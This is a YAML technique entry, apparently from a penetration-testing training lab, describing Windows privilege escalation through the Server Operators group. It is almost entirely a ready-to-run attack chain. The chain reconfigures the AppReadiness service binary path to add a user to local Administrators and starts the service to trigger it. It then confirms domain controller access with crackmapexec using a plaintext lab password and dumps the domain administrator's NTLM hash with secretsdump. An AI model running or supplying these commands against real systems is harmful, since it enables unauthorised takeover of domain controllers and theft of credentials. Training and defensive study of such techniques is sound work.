---
description: |
  Privilege escalation using the Server Operators group to gain local administrator and domain controller access via Windows service manipulation.
  
command: |
  sc qc AppReadiness

code: |
  # Query the AppReadiness service
  sc qc AppReadiness

  # Check service permissions with PsService
  c:\Tools\PsService.exe security AppReadiness

  # View current members of the local Administrators group
  net localgroup Administrators

  # Change the service binary path to add the current user to Administrators
  sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

  # Attempt to start the service (to trigger the payload)
  sc start AppReadiness

  # Confirm the user was added to the Administrators group
  net localgroup Administrators

  # Confirm local admin access on the Domain Controller
  crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'

  # Retrieve NTLM password hashes from the Domain Controller
  secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator

items:
  -
services:
  -
OS:
  - Windows
attack_types:
  - Enumeration
  - Privilege Escalation
references:
  -
---